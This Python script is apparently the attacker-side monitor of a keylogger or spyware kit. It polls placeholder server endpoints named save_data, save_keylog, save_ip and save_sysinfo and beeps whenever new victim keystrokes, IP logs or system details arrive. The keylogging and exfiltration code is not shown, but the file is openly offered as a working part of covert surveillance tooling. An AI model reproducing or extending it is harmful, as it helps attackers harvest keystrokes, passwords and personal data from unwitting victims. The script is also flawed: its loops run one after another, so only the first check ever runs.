# A Python script that continuously polls a remote server for updates on stored data, keylogs, IP logs, and system info, alerting the user via sound on new data.

import requests
import time
import winsound

SERVER_DATA_URL = "http://ip:port/save_data"
SERVER_KEYLOG_URL = "http://ip:port/save_keylog"
SERVER_IPLOG_URL = "http://ip:port/save_ip"
SERVER_SYSINFO_URL = "http://ip:port/save_sysinfo"

CHECK_INTERVAL = 30

def check_data_status():
    while True:
        try:
            response = requests.get(SERVER_DATA_URL)
            if response.status_code == 200:
                try:
                    data = response.json()
                    if data:
                        print(f"Data received: {data}")
                        winsound.Beep(1000, 500)
                    else:
                        print("No data received.")
                except ValueError:
                    print("Error: Response is not in JSON format.")
            else:
                print(f"Error: Failed to get response. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
            return

        time.sleep(CHECK_INTERVAL)
        
        
def check_keylog_status():
    while True:
        try:
            response = requests.get(SERVER_KEYLOG_URL)
            if response.status_code == 200:
                try:
                    data = response.json()
                    if data:
                        print(f"Data received: {data}")
                        winsound.Beep(1000, 500)
                    else:
                        print("No data received.")
                except ValueError:
                    print("Error: Response is not in JSON format.")
            else:
                print(f"Error: Failed to get response. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
            return

        time.sleep(CHECK_INTERVAL)
        
        
def check_iplog_status():
    while True:
        try:
            response = requests.get(SERVER_IPLOG_URL)
            if response.status_code == 200:
                try:
                    data = response.json()
                    if data:
                        print(f"Data received: {data}")
                        winsound.Beep(1000, 500)
                    else:
                        print("No data received.")
                except ValueError:
                    print("Error: Response is not in JSON format.")
            else:
                print(f"Error: Failed to get response. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
            return

        time.sleep(CHECK_INTERVAL)
        

def check_sysinfo_status():
    while True:
        try:
            response = requests.get(SERVER_SYSINFO_URL)
            if response.status_code == 200:
                try:
                    data = response.json()
                    if data:
                        print(f"Data received: {data}")
                        winsound.Beep(1000, 500)
                    else:
                        print("No data received.")
                except ValueError:
                    print("Error: Response is not in JSON format.")
            else:
                print(f"Error: Failed to get response. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
            return

        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    check_data_status()
    check_keylog_status()
    check_iplog_status()
    check_sysinfo_status()
